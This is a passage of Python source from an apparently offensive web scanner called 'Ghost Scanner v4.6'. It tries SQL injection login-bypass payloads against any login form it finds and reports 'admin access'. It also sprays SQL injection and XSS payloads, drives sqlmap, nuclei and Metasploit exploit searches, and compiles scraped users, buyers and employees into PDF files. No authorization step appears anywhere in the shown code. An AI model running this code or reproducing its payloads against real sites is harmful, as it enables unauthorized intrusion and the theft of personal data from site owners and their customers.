            wp = self._smart_request(f"{target}/wp-login.php", timeout=8)
            if not wp or 'wp-submit' not in wp.text:
                wp = self._smart_request(f"{target}/wp-admin/", timeout=8)
                if not wp or 'wp-login' not in wp.text.lower(): return findings
            readme = self._smart_request(f"{target}/wp-content/plugins/wp-security-audit-log/readme.txt", timeout=5)
            if not readme or 'WP Activity Log' not in readme.text: return findings
            vm = re.search(r"Stable tag:\s*([\d.]+)", readme.text)
            if vm and vm.group(1) <= "5.6.3.1":
                findings.append({"type": "WP Activity Log RCE (CVE-2026-54806)", "param": "User-Agent",
                                 "payload": 'O:13:"WP_HTML_Token":...', "evidence": f"Vuln: {vm.group(1)}",
                                 "risk": "CRITICAL", "confidence": 95,
                                 "poc": {"url": f"{target}/wp-login.php", "curl": f"curl -X POST ...",
                                         "response": "Vulnerable", "statusCode": 200,
                                         "timeDiff": "N/A", "verified": True},
                                 "version": vm.group(1)})
        except: pass
        return findings

    def _force_admin_login(self, forms, base_url, target):
        findings = []
        for form in forms:
            inputs = form.get('inputs', [])
            has_pass = any('password' in i.get('type', '').lower() for i in inputs)
            if not has_pass: continue
            action = form.get('url', base_url)
            method = form.get('method', 'POST')
            user_field = next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['user','email','login'])), None)
            pass_field = next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['pass','pwd'])), None)
            if not user_field or not pass_field: continue
            console = Console()
            console.print(f"[yellow]Login form at {action} → attempting bypass...[/yellow]")
            bypasses = [("admin' --", "anything"),("admin' OR '1'='1' --", "anything"),
                        ("' OR 1=1 --", "' OR 1=1 --"),("admin", "admin' OR '1'='1' --")]
            for username, password in bypasses:
                try:
                    resp = self._smart_request(action, timeout=10, method=method,
                                               data={user_field: username, pass_field: password})
                    if not resp: continue
                    body = resp.text.lower()
                    if any(x in body for x in ['dashboard','welcome','admin','logout']) or resp.status_code in (301, 302):
                        findings.append({"type": "Admin Login Bypass (SQL Injection)", "param": user_field,
                                         "payload": f"{username} / {password}",
                                         "evidence": "Successfully logged in as admin",
                                         "risk": "CRITICAL", "confidence": 95,
                                         "poc": {"url": action,
                                                 "curl": f"curl -X {method} \"{action}\" -d \"{user_field}={username}&{pass_field}={password}\"",
                                                 "response": resp.text[:500], "statusCode": resp.status_code,
                                                 "timeDiff": "N/A",
                                                 "verified": self._verify_poc(action, resp.text, 3)},
                                         "admin_access": True})
                        console.print(f"[bold red]✓ ADMIN ACCESS GRANTED![/bold red]")
                        return findings
                except: continue
        return findings

    def _check_sql(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            start = time.time()
            resp = self._smart_request(url, timeout=6)
            elapsed = time.time() - start
            if not resp: return None
            poc = {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                   "statusCode": resp.status_code, "timeDiff": f"{elapsed:.2f}s",
                   "verified": self._verify_poc(url, resp.text, 3)}
            if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)', resp.text, re.I):
                return {"type": "SQL Injection (Error)", "param": param, "payload": payload[:100],
                        "evidence": "DB error", "risk": "CRITICAL", "confidence": 95, "poc": poc}
            if any(x in payload for x in ['SLEEP','WAITFOR']) and elapsed > 3:
                return {"type": "SQL Injection (Time)", "param": param, "payload": payload[:100],
                        "evidence": f"Delay {elapsed:.1f}s", "risk": "CRITICAL", "confidence": 85, "poc": poc}
        except: pass
        return None

    def _scan_sql(self, target, params):
        results = []
        all_p = self._generate_sqli_1m()
        final = random.sample(all_p, min(200, len(all_p)))
        total = len(params) * len(final)
        if total == 0: return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[red]SQL Injection (1M payloads)", total=total)
            with ThreadPoolExecutor(max_workers=min(self.threads, 50)) as ex:
                futures = [ex.submit(self._check_sql, target, p, v, pl) for p, v in params.items() for pl in final]
                for f in as_completed(futures):
                    r = f.result()
                    if r: results.append(r)
                    progress.update(task, advance=1)
                    self._adaptive_delay(0.1)
        return results

    def _check_xss(self, target, param, value, payload, ctx='html'):
        try:
            url = build_url(target, param, payload)
            resp = self._smart_request(url, timeout=6)
            if not resp or payload not in resp.text: return None
            return {"type": f"XSS (Dalfox {ctx})", "param": param, "payload": payload[:100],
                    "evidence": f"Reflected in {ctx}", "risk": "HIGH", "confidence": 85,
                    "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                            "statusCode": resp.status_code, "timeDiff": "N/A",
                            "verified": self._verify_poc(url, resp.text, 3)},
                    "context": [ctx]}
        except: return None

    def _scan_xss_dalfox(self, target, params):
        results = []
        tasks = [(p, v, pl, ctx) for p, v in params.items() for ctx, pls in self.dalfox_payloads.items() for pl in pls[:10]]
        if not tasks: return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Dalfox XSS", total=len(tasks))
            with ThreadPoolExecutor(max_workers=min(self.threads, 50)) as ex:
                futures = [ex.submit(self._check_xss, target, t[0], t[1], t[2], t[3]) for t in tasks]
                for f in as_completed(futures):
                    r = f.result()
                    if r: results.append(r)
                    progress.update(task, advance=1)
        return results

    def _check_dom_xss(self, html, url):
        findings = []
        for script in re.findall(r'<script[^>]*>(.*?)</script>', html, re.I | re.S):
            for sink in ['document.write','innerHTML','eval','setTimeout','location=']:
                if sink in script:
                    findings.append({"type": "DOM XSS Sink", "param": "N/A", "payload": sink,
                                     "evidence": f"Sink found: {sink}", "risk": "HIGH", "confidence": 60,
                                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": sink,
                                             "statusCode": 200, "timeDiff": "N/A", "verified": True}})
                    break
        return findings

    def _scan_ports(self, domain):
        open_ports = []
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Port Scan", total=len(self.common_ports))
            for port in self.common_ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.5)
                    if s.connect_ex((domain, port)) == 0: open_ports.append(port)
                    s.close()
                except: pass
                progress.update(task, advance=1)
        return open_ports

    # ========== EXTERNAL TOOLS ==========
    def _check_tool_available(self, tool_name):
        try:
            result = subprocess.run([tool_name, '-h'], capture_output=True, timeout=5, text=True,
                                    encoding='utf-8', errors='ignore')
            return result.returncode == 0 or 'Usage' in result.stdout or 'usage' in result.stdout.lower()
        except: return False

    def _run_external_tool(self, cmd, timeout=300, cwd=None):
        console = Console()
        tool_name = cmd[0] if cmd else 'unknown'
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=timeout, text=True, cwd=cwd,
                                    encoding='utf-8', errors='ignore')
            if result.returncode == 0 or result.stdout: return result.stdout or ""
            return result.stderr or ""
        except subprocess.TimeoutExpired:
            console.print(f"[yellow]{tool_name} timeout[/yellow]"); return ""
        except FileNotFoundError:
            console.print(f"[yellow]{tool_name} not found[/yellow]"); return ""
        except Exception as e:
            console.print(f"[yellow]{tool_name} error: {str(e)[:100]}[/yellow]"); return ""

    def _run_nuclei(self, target):
        findings = []
        if not self._check_tool_available('nuclei'): return findings
        Console().print("[cyan]🔥 Nuclei...[/cyan]")
        output = self._run_external_tool(['nuclei','-u',target,'-severity','critical,high,medium','-silent','-jsonl','-timeout','10'], timeout=300)
        for line in output.strip().split('\n'):
            if not line.strip(): continue
            try:
                data = json.loads(line)
                findings.append({"type": f"Nuclei: {data.get('info', {}).get('name', 'Unknown')}",
                                 "param": "N/A", "payload": data.get('matched-at', 'N/A'),
                                 "evidence": data.get('info', {}).get('description', 'Nuclei')[:200],
                                 "risk": data.get('info', {}).get('severity', 'MEDIUM').upper(),
                                 "confidence": 90,
                                 "poc": {"url": data.get('matched-at', target),
                                         "curl": data.get('curl-command', f"curl -k \"{target}\""),
                                         "response": str(data.get('extracted-results', ''))[:300],
                                         "statusCode": 200, "timeDiff": "N/A", "verified": True,
                                         "template": data.get('template-id', 'unknown')}})
            except: continue
        Console().print(f"[green]✓ Nuclei: {len(findings)}[/green]")
        return findings

    def _run_subfinder(self, domain):
        subdomains = []
        if not self._check_tool_available('subfinder'): return subdomains
        Console().print("[cyan]🔥 Subfinder...[/cyan]")
        output = self._run_external_tool(['subfinder','-d',domain,'-silent'], timeout=120)
        for line in output.strip().split('\n'):
            if line.strip() and line.strip() not in subdomains: subdomains.append(line.strip())
        Console().print(f"[green]✓ Subfinder: {len(subdomains)}[/green]")
        return subdomains

    def _run_httpx(self, targets):
        live = []
        if not self._check_tool_available('httpx'): return live
        Console().print("[cyan]🔥 httpx...[/cyan]")
        try:
            result = subprocess.run(['httpx','-silent','-status-code','-title','-tech-detect','-json'],
                                    input='\n'.join(targets), capture_output=True, timeout=180, text=True,
                                    encoding='utf-8', errors='ignore')
            for line in result.stdout.strip().split('\n'):
                if not line.strip(): continue
                try: live.append(json.loads(line))
                except: continue
        except: pass
        Console().print(f"[green]✓ httpx: {len(live)}[/green]")
        return live

    def _run_naabu(self, domain):
        ports = []
        if not self._check_tool_available('naabu'): return ports
        Console().print("[cyan]🔥 Naabu...[/cyan]")
        output = self._run_external_tool(['naabu','-host',domain,'-silent','-top-ports','1000','-rate','1000'], timeout=180)
        for line in output.strip().split('\n'):
            if ':' in line: ports.append(line.strip())
        Console().print(f"[green]✓ Naabu: {len(ports)}[/green]")
        return ports

    def _run_katana(self, target):
        urls = []
        if not self._check_tool_available('katana'): return urls
        Console().print("[cyan]🔥 Katana...[/cyan]")
        output = self._run_external_tool(['katana','-u',target,'-silent','-d','2','-jc','-kf','all'], timeout=180)
        for line in output.strip().split('\n'):
            if line.strip() and line.strip() not in urls: urls.append(line.strip())
        Console().print(f"[green]✓ Katana: {len(urls)}[/green]")
        return urls

    def _run_ffuf(self, target):
        findings = []
        if not self._check_tool_available('ffuf'): return findings
        wordlist = None
        for wl in ['/usr/share/wordlists/dirb/common.txt', '/usr/share/seclists/Discovery/Web-Content/common.txt']:
            if os.path.exists(wl): wordlist = wl; break
        if not wordlist: return findings
        Console().print("[cyan]🔥 ffuf...[/cyan]")
        output = self._run_external_tool(['ffuf','-u',target.rstrip('/') + '/FUZZ','-w',wordlist,
                                          '-mc','200,301,302,401,403','-s','-t','50'], timeout=180)
        for line in output.strip().split('\n'):
            if line.strip():
                findings.append({"type": "Dir/File Found (ffuf)", "param": "N/A", "payload": line.strip(),
                                 "evidence": f"Found: {line.strip()}", "risk": "MEDIUM", "confidence": 85,
                                 "poc": {"url": target.rstrip('/') + '/' + line.strip(),
                                         "curl": f"curl -k \"{target.rstrip('/')}/{line.strip()}\"",
                                         "response": "Accessible", "statusCode": 200,
                                         "timeDiff": "N/A", "verified": True}})
        Console().print(f"[green]✓ ffuf: {len(findings)}[/green]")
        return findings

    def _run_sqlmap(self, target):
        findings = []
        if not self._check_tool_available('sqlmap'): return findings
        if '?' not in target: return findings
        Console().print("[cyan]🔥 sqlmap...[/cyan]")
        output = self._run_external_tool(['sqlmap','-u',target,'--batch','--level','2','--risk','2',
                                          '--output-dir','/tmp/sqlmap_out','--flush-session'], timeout=300)
        if 'is vulnerable' in output.lower() or 'injectable' in output.lower():
            findings.append({"type": "SQL Injection (sqlmap)", "param": "N/A",
                             "payload": "sqlmap detected", "evidence": output[:500],
                             "risk": "CRITICAL", "confidence": 95,
                             "poc": {"url": target, "curl": f"sqlmap -u \"{target}\" --batch",
                                     "response": output[:500], "statusCode": 200,
                                     "timeDiff": "N/A", "verified": True}})
        Console().print(f"[green]✓ sqlmap: {len(findings)}[/green]")
        return findings

    def _run_dalfox(self, target):
        findings = []
        if not self._check_tool_available('dalfox'): return findings
        Console().print("[cyan]🔥 Dalfox (external)...[/cyan]")
        output = self._run_external_tool(['dalfox','url',target,'--silence','--no-spinner'], timeout=180)
        for line in output.strip().split('\n'):
            if '[V]' in line or '[POC]' in line:
                findings.append({"type": "XSS (Dalfox external)", "param": "N/A", "payload": line.strip()[:100],
                                 "evidence": line.strip()[:200], "risk": "HIGH", "confidence": 90,
                                 "poc": {"url": target, "curl": f"dalfox url \"{target}\"",
                                         "response": line.strip()[:300], "statusCode": 200,
                                         "timeDiff": "N/A", "verified": True}})
        Console().print(f"[green]✓ Dalfox: {len(findings)}[/green]")
        return findings

    def _run_amass(self, domain):
        assets = []
        if not self._check_tool_available('amass'): return assets
        Console().print("[cyan]🔥 Amass...[/cyan]")
        output = self._run_external_tool(['amass','enum','-d',domain,'-silent','-timeout','5'], timeout=300)
        for line in output.strip().split('\n'):
            if line.strip(): assets.append(line.strip())
        Console().print(f"[green]✓ Amass: {len(assets)}[/green]")
        return assets

    def _run_dnsx(self, domain):
        records = []
        if not self._check_tool_available('dnsx'): return records
        Console().print("[cyan]🔥 dnsx...[/cyan]")
        output = self._run_external_tool(['dnsx','-d',domain,'-a','-resp','-silent'], timeout=60)
        for line in output.strip().split('\n'):
            if line.strip(): records.append(line.strip())
        Console().print(f"[green]✓ dnsx: {len(records)}[/green]")
        return records

    def _run_gau(self, domain):
        urls = []
        if not self._check_tool_available('gau'): return urls
        Console().print("[cyan]🔥 gau...[/cyan]")
        output = self._run_external_tool(['gau',domain,'--threads','5','--timeout','30'], timeout=120)
        for line in output.strip().split('\n'):
            if line.strip() and line.strip() not in urls: urls.append(line.strip())
        Console().print(f"[green]✓ gau: {len(urls)}[/green]")
        return urls

    def _run_waybackurls(self, domain):
        urls = []
        if not self._check_tool_available('waybackurls'): return urls
        Console().print("[cyan]🔥 waybackurls...[/cyan]")
        try:
            result = subprocess.run(['waybackurls',domain], capture_output=True, timeout=120, text=True,
                                    encoding='utf-8', errors='ignore')
            for line in result.stdout.strip().split('\n'):
                if line.strip() and line.strip() not in urls: urls.append(line.strip())
        except: pass
        Console().print(f"[green]✓ waybackurls: {len(urls)}[/green]")
        return urls

    def _run_arjun(self, target):
        params = []
        if not self._check_tool_available('arjun'): return params
        Console().print("[cyan]🔥 Arjun...[/cyan]")
        output = self._run_external_tool(['arjun','-u',target,'--stable','-q'], timeout=180)
        if 'Parameters found' in output or 'valid' in output.lower():
            for line in output.strip().split('\n'):
                if ':' in line or '=' in line: params.append(line.strip())
        Console().print(f"[green]✓ Arjun: {len(params)}[/green]")
        return params

    def _run_secretfinder(self, js_urls):
        findings = []
        secretfinder_path = os.path.expanduser("~/SecretFinder/SecretFinder.py")
        if not os.path.exists(secretfinder_path): return findings
        Console().print("[cyan]🔥 SecretFinder...[/cyan]")
        for js_url in js_urls[:20]:
            output = self._run_external_tool(['python3',secretfinder_path,'-i',js_url,'-o','cli'], timeout=60)
            if output and ('apikey' in output.lower() or 'token' in output.lower()):
                findings.append({"type": "Secret in JS", "param": "N/A", "payload": js_url,
                                 "evidence": output[:300], "risk": "HIGH", "confidence": 80,
                                 "poc": {"url": js_url, "curl": f"curl -k \"{js_url}\"",
                                         "response": output[:300], "statusCode": 200,
                                         "timeDiff": "N/A", "verified": True}})
        Console().print(f"[green]✓ SecretFinder: {len(findings)}[/green]")
        return findings

    def _run_interactsh(self, target):
        findings = []
        if not self._check_tool_available('interactsh-client'): return findings
        Console().print("[cyan]🔥 Interactsh...[/cyan]")
        try:
            result = subprocess.run(['interactsh-client','-n','1','-v'], capture_output=True, timeout=30, text=True,
                                    encoding='utf-8', errors='ignore')
            for line in result.stdout.split('\n'):
                if '.oast.' in line or '.interact.sh' in line:
                    findings.append({"type": "Interactsh OOB Callback", "param": "N/A",
                                     "payload": line.strip(), "evidence": "OOB callback URL",
                                     "risk": "INFO", "confidence": 70,
                                     "poc": {"url": target, "curl": f"nslookup {line.strip()}",
                                             "response": line.strip(), "statusCode": 200,
                                             "timeDiff": "N/A", "verified": False}})
        except: pass
        Console().print(f"[green]✓ Interactsh: {len(findings)}[/green]")
        return findings

    # ---------- v4.6 NEW TOOLS ----------
    def _run_nmap(self, target):
        findings = []
        if not self._check_tool_available('nmap'):
            Console().print("[yellow]nmap not found. Download: https://nmap.org/download[/yellow]")
            return findings
        Console().print("[cyan]🔥 Nmap...[/cyan]")
        try:
            domain = urlparse(target).netloc.split(':')[0]
            output = self._run_external_tool(['nmap','-sV','-T4','--top-ports','100','-oX','-',domain], timeout=300)
            if output:
                import xml.etree.ElementTree as ET
                xml_start = output.find('<?xml')
                if xml_start >= 0:
                    try:
                        root = ET.fromstring(output[xml_start:])
                        for host in root.findall('host'):
                            for port in host.findall('.//port'):
                                port_id = port.get('portid')
                                state = port.find('state')
                                service = port.find('service')
                                if state is not None and state.get('state') == 'open':
                                    svc_name = service.get('name', 'unknown') if service is not None else 'unknown'
                                    svc_product = service.get('product', '') if service is not None else ''
                                    svc_version = service.get('version', '') if service is not None else ''
                                    findings.append({"type": f"Nmap: Open Port {port_id}",
                                                     "param": "N/A", "payload": str(port_id),
                                                     "evidence": f"Service: {svc_name} {svc_product} {svc_version}".strip(),
                                                     "risk": "MEDIUM" if port_id in ['22','3306','5432','6379','27017'] else "INFO",
                                                     "confidence": 95,
                                                     "poc": {"url": f"{domain}:{port_id}",
                                                             "curl": f"nmap -sV -p {port_id} {domain}",
                                                             "response": f"{svc_name} {svc_product} {svc_version}".strip(),
                                                             "statusCode": 200, "timeDiff": "N/A", "verified": True}})
                    except: pass
        except Exception as e:
            Console().print(f"[yellow]nmap error: {str(e)[:100]}[/yellow]")
        Console().print(f"[green]✓ Nmap: {len(findings)} open port(s)[/green]")
        return findings

    def _run_metasploit(self, target):
        findings = []
        if not self._check_tool_available('msfconsole'):
            Console().print("[yellow]Metasploit not found. Download: https://www.metasploit.com/download[/yellow]")
            return findings
        Console().print("[cyan]🔥 Metasploit...[/cyan]")
        try:
            domain = urlparse(target).netloc.split(':')[0]
            output = self._run_external_tool(['msfconsole','-q','-x',f'search type:exploit platform:multi {domain}; exit'], timeout=180)
            for line in output.split('\n'):
                if 'exploit/' in line and 'multi/' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        module = parts[0]; rank = parts[1]
                        findings.append({"type": "Metasploit Module Available", "param": "N/A",
                                         "payload": module, "evidence": f"{module} | Rank: {rank}",
                                         "risk": "HIGH" if rank in ['excellent','great'] else "MEDIUM",
                                         "confidence": 80,
                                         "poc": {"url": target, "curl": f"msfconsole -q -x 'use {module}; show options'",
                                                 "response": line.strip(), "statusCode": 200,
                                                 "timeDiff": "N/A", "verified": True}})
                        if len(findings) >= 10: break
        except Exception as e:
            Console().print(f"[yellow]Metasploit error: {str(e)[:100]}[/yellow]")
        Console().print(f"[green]✓ Metasploit: {len(findings)} module(s)[/green]")
        return findings

    def _run_wireshark(self, target, duration=10):
        findings = []
        tshark = None
        for path in ['tshark', 'C:\\Program Files\\Wireshark\\tshark.exe']:
            if self._check_tool_available(path): tshark = path; break
        if not tshark:
            Console().print("[yellow]tshark not found. Download: https://www.wireshark.org/download.html[/yellow]")
            return findings
        Console().print("[cyan]🔥 Wireshark (tshark)...[/cyan]")
        try:
            import tempfile
            pcap_file = os.path.join(tempfile.gettempdir(), f'ghost_cap_{int(time.time())}.pcap')
            domain = urlparse(target).netloc.split(':')[0]
            try:
                cap_proc = subprocess.Popen(
                    [tshark, '-i', 'Wi-Fi', '-f', f'host {domain}', '-a', f'duration:{duration}', '-w', pcap_file, '-q'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                    encoding='utf-8', errors='ignore'
                )
                time.sleep(2)
                self._smart_request(target, timeout=10)
                time.sleep(duration - 2)
                cap_proc.terminate()
                time.sleep(1)
            except: pass
            if os.path.exists(pcap_file):
                http_out = self._run_external_tool([tshark, '-r', pcap_file, '-Y', 'http.request', '-T',
                                                    'fields', '-e', 'http.host', '-e', 'http.request.uri'], timeout=60)
                if http_out:
                    findings.append({"type": "Wireshark Packet Capture", "param": "N/A", "payload": "N/A",
                                     "evidence": f"Captured packets. HTTP requests: {len(http_out.split(chr(10)))}",
                                     "risk": "INFO", "confidence": 100,
                                     "poc": {"url": target, "curl": f"tshark -r {pcap_file} -Y http.request",
                                             "response": http_out[:500], "statusCode": 200,
                                             "timeDiff": f"{duration}s", "verified": True,
                                             "pcap_file": pcap_file}})
                Console().print(f"[green]✓ Wireshark: {pcap_file}[/green]")
        except Exception as e:
            Console().print(f"[yellow]Wireshark error: {str(e)[:100]}[/yellow]")
        return findings

    def _run_burpsuite(self, target):
        findings = []
        burp_api = 'http://127.0.0.1:1337'
        try:
            r = requests.get(f'{burp_api}/', timeout=3)
            if r.status_code == 200 or 'burp' in r.text.lower():
                Console().print("[cyan]🔥 BurpSuite API...[/cyan]")
                scan_resp = requests.post(f'{burp_api}/v0.1/scan', json={'urls': [target]}, timeout=10)
                if scan_resp.status_code == 200:
                    scan_id = scan_resp.json().get('scan_id', 'unknown')
                    findings.append({"type": "BurpSuite Scan Started", "param": "N/A", "payload": "N/A",
                                     "evidence": f"Scan ID: {scan_id}", "risk": "INFO", "confidence": 100,
                                     "poc": {"url": f"{burp_api}/v0.1/scan/{scan_id}",
                                             "curl": f"curl -X POST {burp_api}/v0.1/scan",
                                             "response": f"Scan ID: {scan_id}", "statusCode": 200,
                                             "timeDiff": "N/A", "verified": True}})
                    Console().print(f"[green]✓ BurpSuite: {scan_id}[/green]")
        except:
            Console().print("[yellow]BurpSuite API not running (default: 127.0.0.1:1337)[/yellow]")
        return findings

    # ---------- AI ----------
    def _ai_analysis(self, findings, target, admin_data=None):
        if not self.ai: return ""
        console = Console()
        console.print("[yellow]Running AI analysis...[/yellow]")
        admin_ctx = f"\n\nADMIN DATA:\n{json.dumps(admin_data, indent=2)[:3000]}" if admin_data else ""
        prompt = f"""Anda adalah Senior Cyber Security Consultant (OSCP, CISSP, CEH).
Target: {target}
Findings: {json.dumps(findings, indent=2)[:8000]}{admin_ctx}

Berikan analisis dalam format Markdown:
## RINGKASAN EKSEKUTIF
## TEMUAN KRITIS + Mitigasi
## TEMUAN HIGH + Mitigasi
## ANALISIS DATA SENSITIF (UU PDP/GDPR)
## REKOMENDASI PERBAIKAN (Prioritas)
## SARAN PENGUJIAN LANJUTAN
## KRITIK KONSTRUKTIF
## BEST PRACTICES
"""
        for attempt in range(3):
            try:
                r = requests.post(f"{AI_BASE_URL}/chat/completions",
                                  headers={'Authorization': f'Bearer {AI_API_KEY}', 'Content-Type': 'application/json'},
                                  json={"model": AI_MODEL, "messages": [{"role": "user", "content": prompt}], "max_tokens": 4000},
                                  timeout=180)
                if r.status_code == 200: return r.json()['choices'][0]['message']['content']
            except Exception as e:
                console.print(f"[yellow]AI attempt {attempt+1}: {str(e)[:100]}[/yellow]"); time.sleep(5)
        return "AI Analysis failed."

    # ---------- PDF ----------
    def _generate_pdf(self, results, output_path="report.pdf"):
        class PDF(FPDF):
            def header(self):
                self.set_font('Arial', 'B', 16)
                self.cell(0, 10, 'Ghost Scanner v4.6 - Report', ln=True, align='C'); self.ln(5)
            def footer(self):
                self.set_y(-15); self.set_font('Arial', 'I', 8)
                self.cell(0, 10, f'Page {self.page_no()}', align='C')
        pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
        pdf.cell(0, 8, f'Target: {results["target"]}', ln=True)
        pdf.cell(0, 8, f'Category: {results.get("domain_category", "N/A")}', ln=True)
        pdf.cell(0, 8, f'Time: {results["timestamp"]}', ln=True)
        pdf.cell(0, 8, f'Duration: {results["scan_duration"]:.2f}s', ln=True)
        pdf.ln(3)
        pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Summary', ln=True)
        pdf.set_font('Arial', '', 11); s = results["summary"]
        pdf.cell(0, 8, f'Total: {s["total"]} | Critical: {s["critical"]} | High: {s["high"]} | Medium: {s["medium"]} | Low: {s["low"]}', ln=True)
        pdf.ln(3)
        pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Vulnerabilities', ln=True)
        pdf.set_font('Arial', '', 9)
        for vt, vs in results["vulnerabilities"].items():
            if vs:
                pdf.set_font('Arial', 'B', 10); pdf.cell(0, 6, f'[{vt}] {len(vs)} finding(s)', ln=True)
                pdf.set_font('Arial', '', 8)
                for v in vs[:3]:
                    pdf.multi_cell(0, 5, f"  Param: {v.get('param','N/A')} | Payload: {v.get('payload','N/A')[:50]} | Risk: {v.get('risk')}")
                pdf.ln(1)
        pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Sensitive Data', ln=True)
        pdf.set_font('Arial', '', 9)
        for k, v in results["sensitive_data"].items():
            if v: pdf.multi_cell(0, 5, f'{k.upper()}: {", ".join(str(x) for x in v[:10])}')
        if results.get("ai_analysis"):
            pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'AI Analysis', ln=True)
            pdf.set_font('Arial', '', 9)
            pdf.multi_cell(0, 6, results["ai_analysis"].replace('**','').replace('###','>>>')[:8000])
        pdf.output(output_path)
        Console().print(f"[green]PDF: {output_path}[/green]")

    def _save_sensitive_data(self, all_s):
        combined = {}
        for s in all_s:
            for k, v in s.items():
                combined.setdefault(k, []).extend(v)
        ts = int(time.time())
        for k, v in combined.items():
            if v:
                uniq = list(set(str(x) for x in v if x))
                if uniq:
                    fn = f"{self.sensitive_folder}/{k}_{ts}.txt"
                    with open(fn, 'w', encoding='utf-8') as f: f.write('\n'.join(uniq))
                    self.results_scan["sensitive_data"][k] = uniq[:20]

    def _generate_sensitive_pdf(self, data_type, data_list, target, output_dir):
        if not data_list: return None
        class PDF(FPDF):
            def header(self):
                self.set_font('Arial', 'B', 14)
                self.cell(0, 10, f'{data_type.upper()} - Ghost Scanner v4.6', ln=True, align='C'); self.ln(3)
            def footer(self):
                self.set_y(-15); self.set_font('Arial', 'I', 8)
                self.cell(0, 10, f'Target: {target} | Page {self.page_no()}', align='C')
        pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
        pdf.cell(0, 8, f'Target: {target}', ln=True)
        pdf.cell(0, 8, f'Data Type: {data_type.upper()}', ln=True)
        pdf.cell(0, 8, f'Total: {len(data_list)}', ln=True)
        pdf.ln(5); pdf.set_font('Arial', 'B', 12); pdf.cell(0, 8, 'DATA:', ln=True)
        pdf.set_font('Arial', '', 9)
        for i, item in enumerate(data_list[:500], 1):
            text = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
            pdf.multi_cell(0, 5, f'{i}. {text[:300]}')
        os.makedirs(output_dir, exist_ok=True)
        filename = os.path.join(output_dir, f'{data_type}_{int(time.time())}.pdf')
        pdf.output(filename)
        Console().print(f"[green]✓ PDF {data_type}: {filename}[/green]")
        return filename

    def _generate_all_sensitive_pdfs(self, sensitive_data, admin_data, target):
        pdf_dir = os.path.join(self.sensitive_folder, 'pdfs')
        os.makedirs(pdf_dir, exist_ok=True)
        pdfs = []
        for key, values in sensitive_data.items():
            if values and isinstance(values, list) and len(values) > 0:
                fp = self._generate_sensitive_pdf(key, values, target, pdf_dir)
                if fp: pdfs.append(fp)
        if admin_data:
            for key in ['users','buyers','employees','orders','products']:
                if admin_data.get(key) and len(admin_data[key]) > 0:
                    fp = self._generate_sensitive_pdf(f'admin_{key}', admin_data[key], target, pdf_dir)
                    if fp: pdfs.append(fp)
        self.results_scan["sensitive_pdfs"] = pdfs

    # ---------- MAIN SCAN ----------
    def run_scan(self, target):
        self.results_scan["target"] = target
        self.results_scan["domain"] = urlparse(target).netloc
        self.results_scan["domain_category"] = self._classify_domain(self.results_scan["domain"])
        self.results_scan["timestamp"] = datetime.now().isoformat()
        start = time.time()
        console = Console()
        console.print(f"[bold red]🚀 Ghost Scan v4.6 on {target}[/bold red]")
        console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")

        resp = self._smart_request(target, timeout=15)
        if not resp:
            console.print("[red]Failed to access target![/red]"); return
        html = resp.text

        # Internal scans
        console.print("[yellow]Internal scans...[/yellow]")
        self.results_scan["vulnerabilities"]["robots"] = self._check_robots(target)
        self.results_scan["vulnerabilities"]["sitemap"] = self._check_sitemap(target)
        self.results_scan["vulnerabilities"]["dir_enum"] = self._check_dir_enum(target)
        self.results_scan["vulnerabilities"]["sensitive_files"] = self._check_sensitive_files(target)
        self.results_scan["vulnerabilities"]["security_headers"] = self._check_security_headers(target)
        self.results_scan["vulnerabilities"]["waf_detection"] = self._check_waf(target)
        self.results_scan["vulnerabilities"]["cors"] = self._check_cors_sneijder(target)
        self.results_scan["vulnerabilities"]["open_redirect_sneijder"] = self._check_open_redirect_sneijder(target)
        self.results_scan["vulnerabilities"]["ssl_info"] = self._check_ssl_info(target)
        self.results_scan["vulnerabilities"]["cookie_flags"] = self._check_cookie_flags(target)
        self.results_scan["vulnerabilities"]["rate_limit_sneijder"] = self._check_rate_limit_sneijder(target)
        self.results_scan["vulnerabilities"]["wp_activity_log_rce"] = self._check_wp_activity_log(target)
        self.results_scan["vulnerabilities"]["deface"] = self._check_deface(target)

        forms = self._extract_forms(html, target)
        self.results_scan["vulnerabilities"]["csrf_sneijder"] = self._check_csrf_sneijder(target, forms)

        admin_res = self._force_admin_login(forms, target, target)
        self.results_scan["vulnerabilities"]["admin_access"] = admin_res
        self.results_scan["vulnerabilities"]["login_bypass"] = admin_res

        all_p = {}
        all_p.update(self._extract_params_from_url(target))
        for form in forms:
            if form['method'] == 'GET':
                for i in form['inputs']: all_p[i['name']] = '1'
        api_urls = self._extract_api_endpoints(html, target)
        for u in api_urls:
            for c in self.common_params: all_p[c] = '1'
        if not all_p:
            for c in self.common_params[:30]: all_p[c] = '1'
